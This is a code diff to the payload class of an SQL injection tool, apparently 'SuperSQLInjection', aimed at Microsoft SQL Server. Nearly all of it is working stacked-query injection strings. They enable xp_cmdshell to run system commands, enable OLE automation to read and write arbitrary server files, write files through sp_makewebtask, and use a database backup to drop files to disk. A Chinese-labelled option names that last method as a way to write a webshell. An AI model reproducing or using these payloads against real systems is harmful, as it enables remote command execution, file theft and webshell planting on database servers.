@@ -69,17 +69,23 @@ namespace SuperSQLInjection.payload
 
 
         //cmd
-        public static String createTable = " 1=1;drop table ssqlinjection;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
+        public static String createTableAndExecCmd = " 1=1;create table ssqlinjection(id int primary key identity,data varchar(8000));exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;declare @cmd varchar(8000);set @cmd={cmd};insert into ssqlinjection(data) exec [master]..[xp_cmdshell] @cmd;select 1 where 1=1 ";
         public static String cmdData = "cast((select top 1 data from ssqlinjection where id={index}) as varchar(8000))";
         public static String cmdDataCount = "(select (select count(*) from ssqlinjection))";
         public static String dropTable = " 1=1;drop table ssqlinjection;select 1 where 1=1 ";
+
+        public static String dropWriteFileBackUpTableAndDropDB = " 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 ";
+
+        public static String createWriteFileBackUpTable = " 1=1;create table [ssqlinjection]..[data] (content image);select 1 where 1=1 ";
+
+        public static String createWriteFileBackUpDB = " 1=1;create database ssqlinjection;select 1 where 1=1 ";
 
 
         //文件读写
         public static String witeFileByFileSystemObject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data={data};declare @path varchar(4000);set @path={path};exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;select 1 where 1=1 ";
         public static String witeFileBySP_MakeWebTask = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'web assistant procedures',1;reconfigure;declare @d varchar(8000);set @d={data};declare @p varchar(4000);set @p={path};exec sp_makewebtask @p, @d;select 1 where 1=1 ";
-        public static String witeFileByBackDataBase = " 1=1;drop database ssqlinjection;create database ssqlinjection;drop table [ssqlinjection]..[data];create table [ssqlinjection]..[data] (content image);insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 ";
-        public static String readFileByFileSystemobject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';drop table ssqlinjection;create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 ";
+        public static String witeFileByBackDataBase = " 1=1;insert into [ssqlinjection]..[data](content) values({data});declare @s varchar(8000);set @s={path} backup database ssqlinjection to disk=@s;select 1 where 1=1 ";
+        public static String readFileByFileSystemobject = " 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 ";
 
         //读文件的的payload
         public static String file_content = "(select data from ssqlinjection)";
@@ -259,5 +265,18 @@ namespace SuperSQLInjection.payload
             return payload;
         }
 
+        /// <summary>
+        /// 反射条调用，加载显示支持的文件操作
+        /// </summary>
+        /// <returns></returns>
+        public static List<String> getShowCanDoFile()
+        {
+            List<String> list = new List<String>();
+            list.Add("SQLServer FileSystemObject写文件");
+            list.Add("SQLServer Sp_MakeWebTask写文件");
+            list.Add("SQLServer 备份写WebShell(有多余数据)");
+            list.Add("SQLServer FileSystemObject读文件");
+            return list;     
+        }
     }
 }
